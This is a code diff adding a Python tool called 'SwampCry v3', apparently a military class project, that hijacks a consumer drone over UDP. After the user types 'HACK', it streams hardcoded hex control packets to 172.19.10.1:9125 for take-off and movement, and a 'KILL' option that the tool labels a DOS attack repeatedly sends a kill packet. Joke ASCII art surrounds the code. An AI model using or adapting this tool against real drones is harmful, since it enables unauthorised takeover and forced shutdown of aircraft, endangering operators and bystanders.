@@ -1,0 +1,359 @@
+import socket
+import codecs
+import os
+import threading
+import time
+import sys
+
+### Variables ###
+HOST = '172.19.10.1'
+UDP_PORT = 9125
+cmd = '6680808080000099'
+take_off_cmd = '6680808080010199'
+turn_left = '668280806b00e999'
+turn_right = '6682808788000d99'
+forward_move = '66824c808100cf99'
+backwards_move = '668554808100d099'
+strafe_left = '6682807d8100fe99'
+strafe_right = '66b5828081003699'
+kill = '668280007b007999'
+
+### Additional commands/backups
+#rotate_cmd = '668080508000d099'
+#new_cmd = '668080288000a899'
+#idle_command = cmd
+
+### UDP socket stuff ###
+udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+udp_socket.connect((HOST, UDP_PORT))
+
+### Functions ###
+def cry():
+    print('''
+\033[92m███████╗██╗    ██╗ █████╗ ███╗   ███╗██████╗  ██████╗██████╗ ██╗   ██╗    ██╗   ██╗██████╗ 
+██╔════╝██║    ██║██╔══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗╚██╗ ██╔╝    ██║   ██║╚════██╗
+███████╗██║ █╗ ██║███████║██╔████╔██║██████╔╝██║     ██████╔╝ ╚████╔╝     ██║   ██║ █████╔╝
+╚════██║██║███╗██║██╔══██║██║╚██╔╝██║██╔═══╝ ██║     ██╔══██╗  ╚██╔╝      ╚██╗ ██╔╝ ╚═══██╗
+███████║╚███╔███╔╝██║  ██║██║ ╚═╝ ██║██║     ╚██████╗██║  ██║   ██║        ╚████╔╝ ██████╔╝
+╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝      ╚═════╝╚═╝  ╚═╝   ╚═╝         ╚═══╝  ╚═════╝\033[0m (TM) 
+                                                                                           
+                                    SWAMPCRY v3
+                                     CLASS 904
+                                    
+                                    TEAM LEADER:
+                                    PFC BRADSHAW
+                                    
+                                    DEVOPS TEAM:
+                                     SSG HIRSCH
+                                    SGT WEBSTER
+                                     SGT RONA
+                                                                                           
+                                                                                           
+                                                                                           ''')
+
+def key():
+    print('''  
+. -------------------------------------------------------------------.        
+| [Esc] [F1][F2][F3][F4][F5][F6][F7][F8][F9][F0][F10][F11][F12] o o o|        
+|                                                                    |        
+| [`][1][2][3][4][5][6][7][8][9][\033[92m0\033[0m][-][=][_<_] [I][H][U] [N][/][*][-]|        
+| [|-][\033[91mQ\033[0m][\033[91mW\033[0m][\033[91mE\033[0m][R][\033[91mT\033[0m][Y][U][I][O][P][{][}] | | [D][E][D] [7][8][9]|+||        
+| [CAP][\033[91mA\033[0m][\033[91mS\033[0m][\033[91mD\033[0m][F][G][H][J][K][L][;]['][#]|_|           [4][5][6]|_||        
+| [^][\][Z][X][C][V][B][N][M][,][.][/] [__^__]    [^]    [1][2][3]| ||        
+| [c]   [a][________________________][a]   [c] [<][V][>] [ 0  ][.]|_||        
+`--------------------------------------------------------------------'        
+    ''')
+
+def take_off():
+    global take_off_cmd
+    while 1:
+        udp_socket.send(codecs.decode(take_off_cmd, 'hex'))
+        time.sleep(.05)
+
+def command_sender():
+    global cmd
+    while 1:
+        udp_socket.send(codecs.decode(cmd, 'hex'))
+        time.sleep(.05)
+
+def rotate_left():
+    global turn_left
+    while 1:
+        udp_socket.send(codecs.decode(turn_left, 'hex'))
+        time.sleep(.05)
+
+def rotate_right():
+    global turn_right
+    while 1:
+        udp_socket.send(codecs.decode(turn_right,                                                                                                              'hex'))
+        time.sleep(.05)
+
+def forward():
+    global forward_move
+    while 1:
+        udp_socket.send(codecs.decode(forward_move, 'hex'))
+        time.sleep(.05)
+
+def back():
+    global backwards_move
+    while 1:
+        udp_socket.send(codecs.decode(backwards_move, 'hex'))
+        time.sleep(.05)
+
+def s_left():
+    global strafe_left
+    while 1:
+        udp_socket.send(codecs.decode(strafe_left, 'hex'))
+        time.sleep(.05)
+
+def s_right():
+    global strafe_right
+    while 1:
+        udp_socket.send(codecs.decode(strafe_right, 'hex'))
+        time.sleep(.05)
+
+
+def flaccide():
+    global kill
+    while 1:
+        udp_socket.send(codecs.decode(kill, 'hex'))
+        time.sleep(.05)
+
+### CLEARING THE SCREEN TO START ###
+os.system('clear')
+
+while True:
+    cry()
+    begin = input("Welcome to SwampCry v3! To use the program, please type \"\033[91mENTER\033[0m\".  \n\nroot@swamp >>> ")
+
+    if begin == "ENTER":
+        os.system('clear')
+        cry()
+        print("\033[91mSTATUS:",end='')
+        print("\033[0m LOADING",end='')
+        for char in "...": 
+                print(char, end='') 
+                sys.stdout.flush() 
+                time.sleep(.5)
+        time.sleep(1)
+        os.system('clear')
+        break
+    elif begin != "ENTER":
+        os.system('clear')
+        cry()
+        print("\033[91mERROR:",end='')
+        print("\033[0m COMMAND NOT RECOGNIZED. PLEASE ENTER THE COMMAND \"\033[91mENTER\033[0m\" IN ALL CAPS. \n")
+        time.sleep(3)
+        os.system('clear')
+
+### INITIAL STAGE OF PROGRAM ###
+# NOTES: THIS IS THE FIRST PAGE THAT'S OPENED. 
+while True:
+    cry()
+    drone = input("Enter \"\033[91mHACK\033[0m\" to take over the drone.\n\nroot@swamp >>> ")
+
+    if drone == "HACK":
+        threading.Thread(target=command_sender).start()
+        time.sleep(.05)
+        os.system('clear')
+        cry()
+        print("\033[91mSTATUS:",end='')
+        print("\033[0m INITIALIZING CONNECTION",end='')
+        for char in "...": 
+                print(char, end='') 
+                sys.stdout.flush() 
+                time.sleep(.5)
+        time.sleep(1)
+        os.system('clear')
+        break
+    elif begin != "HACK":
+        os.system('clear')
+        cry()
+        print("\033[91mERROR:",end='')
+        print("\033[0m COMMAND NOT RECOGNIZED. PLEASE ENTER THE COMMAND \"\033[91mHACK\033[0m\" IN ALL CAPS. \n")
+        time.sleep(3)
+        os.system('clear')
+
+### CLEAR SCREEN FROM INTRO ###
+os.system('clear')
+
+### DEFINE VARIABLES FOR MAIN LOOP ###
+a = 1
+b = 1
+
+### MAIN PROGRAM LOOP ###
+while a == 1:
+    if b == 1:
+        cry()
+        print("\033[91mSTATUS:",end='')
+        print("\033[0m CONNECTED\n")
+        key()
+        b += 1
+
+    new_command = input("Enter \"\033[91mT\033[0m\" to take off.\nEnter \"\033[91mQ\033[0m\" to rotate left.\nEnter \"\033[91mE\033[0m\" to rotate right.\nEnter \"\033[91mW\033[0m\" to move forward.\nEnter \"\033[91mS\033[0m\" to move backwards.\nEnter \"\033[91mA\033[0m\" to strafe left.\nEnter \"\033[91mD\033[0m\" to strafe right.\nEnter \"\033[91m0\033[0m\" to FREE \033[92mShrek\033[0m.\nEnter \"\033[91mKILL\033[0m\" to \033[91mDOS\033[0m!!!\nEnter \"\033[91mEXIT\033[0m\" to exit.\n\nroot@swamp >>> ")
+
+    if new_command == "T":
+        threading.Thread(target=take_off).start()
+        time.sleep(.05)
+        os.system('clear')
+        cry()
+        print("\033[91mSTATUS:",end='')
+        print("\033[0m INITIATING TAKE OFF SEQUENCE",end='')
+        for char in "...": 
+            print(char, end='') 
+            sys.stdout.flush() 
+            time.sleep(.5)
+        time.sleep(1)
+        os.system('clear')
+        cry()
+        print("\033[91mSTATUS:",end='')
+        print("\033[0m TAKE OFF SEQUENCE INITIATED",end='')
+        for char in "...": 
+            print(char, end='') 
+            sys.stdout.flush() 
+            time.sleep(.5)
+        time.sleep(1)
+        os.system('clear')
+        cry()
+        print("\033[91mSTATUS:",end='')
+        print("\033[0m HOVERING\n")
+        key()
+        continue
+
+    elif new_command == "Q":
+        threading.Thread(target=rotate_left).start()
+        time.sleep(.05)
+        os.system('clear')
+        cry()
+        print("\033[91mSTATUS:",end='')
+        print("\033[0m ROTATING LEFT\n")
+        key()
+
+    elif new_command == "E":
+        threading.Thread(target=rotate_right).start()
+        time.sleep(.05)
+        os.system('clear')
+        cry()
+        print("\033[91mSTATUS:",end='')
+        print("\033[0m ROTATING RIGHT\n")
+        key()
+    
+    elif new_command == "W":
+        threading.Thread(target=forward).start()
+        time.sleep(.05)
+        os.system('clear')
+        cry()
+        print("\033[91mSTATUS:",end='')
+        print("\033[0m FLYING FORWARD\n")
+        key()
+
+    elif new_command == "S":
+        threading.Thread(target=back).start()
+        time.sleep(.05)
+        os.system('clear')
+        cry()
+        print("\033[91mSTATUS:",end='')
+        print("\033[0m FLYING BACKWARD\n")
+        key()
+
+    elif new_command == "A":
+        threading.Thread(target=s_left).start()
+        time.sleep(.05)
+        os.system('clear')
+        cry()
+        print("\033[91mSTATUS:",end='')
+        print("\033[0m STRAFING LEFT\n")
+        key()
+
+    elif new_command == "D":
+        threading.Thread(target=s_right).start()
+        time.sleep(.05)
+        os.system('clear')
+        cry()
+        print("\033[91mSTATUS:",end='')
+        print("\033[0m STRAFING RIGHT\n")
+        key()
+
+    elif new_command == "KILL":
+        threading.Thread(target=flaccide).start()
+        time.sleep(.05)
+        os.system('clear')
+        print('''
+                \033[91muuuuuuu
+           uu$$$$$$$$$$$uu
+        uu$$$$$$$$$$$$$$$$$uu
+       u$$$$$$$$$$$$$$$$$$$$$u
+      u$$$$$$$$$$$$$$$$$$$$$$$u
+     u$$$$$$$$$$$$$$$$$$$$$$$$$u
+     u$$$$$$$$$$$$$$$$$$$$$$$$$u
+     u$$$$$$"   "$$$"   "$$$$$$u
+     "$$$$"      u$u       $$$$"
+      $$$u       u$u       u$$$
+      $$$u      u$$$u      u$$$
+       "$$$$uu$$$   $$$uu$$$$"
+        "$$$$$$$"   "$$$$$$$"
+          u$$$$$$$u$$$$$$$u
+           u$"$"$"$"$"$"$u
+uuu        $$u$ $ $ $ $u$$       uuu
+u$$$$        $$$$$u$u$u$$$       u$$$$
+$$$$$uu      "$$$$$$$$$"     uu$$$$$$
+u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
+$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
+"""      ""$$$$$$$$$$$uu ""$"""
+        uuuu ""$$$$$$$$$$uuu
+u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
+$$$$$$$$$$""""           ""$$$$$$$$$$$"
+"$$$$$"                      ""$$$$""
+    $$$"                         $$$$"\033[0m              
+        ''')
+        print("\033[91mSTATUS:\033[0m DOS\n")
+        print("DOS ATTACK INITIATED FOR 15 SECONDS.\nPROGRAM WILL RETURN TO HOME PAGE AFTER ATTACK IS FINISHED.")
+        time.sleep(5)
+        os.system('clear')
+        cry()
+
+    elif new_command == "EXIT":
+        os.system('clear')
+        print("EXITING",end='')
+        for char in "...": 
+            print(char, end='') 
+            sys.stdout.flush() 
+            time.sleep(.5)
+        time.sleep(2)
+        os.system('clear')
+        os._exit(0)
+
+    elif new_command == "0":
+        os.system('clear')
+        print('''
+        
+\033[92m⢀⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
+\033[92m⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
+\033[92m⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀ 
+\033[92m⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆⠀⠀⠀⠀⠀⠀⠀ 
+\033[92m⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆ 
+\033[92m⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠁⠸⣼⡿ 
+\033[92m⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉⠀⠀⠀⠀⠀ 
+\033[92m⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀ 
+\033[92m⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀ 
+\033[92m⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀ 
+\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀ 
+\033[92m⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀ 
+\033[92m⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀ 
+\033[92m⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
+\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⠿⠿⠿⠛⠉
+        
+\033[92m   THANK YOU, MY CHILD         
+        ''')
+        time.sleep(3)
+        os.system('clear')
+        os._exit(0)
+        
+    else:
+        os.system('clear')
+        cry()
+        print("\033[91mERROR:",end='')
+        print("\033[0m COMMAND NOT RECOGNIZED\n")
+        time.sleep(1.5)
+
+
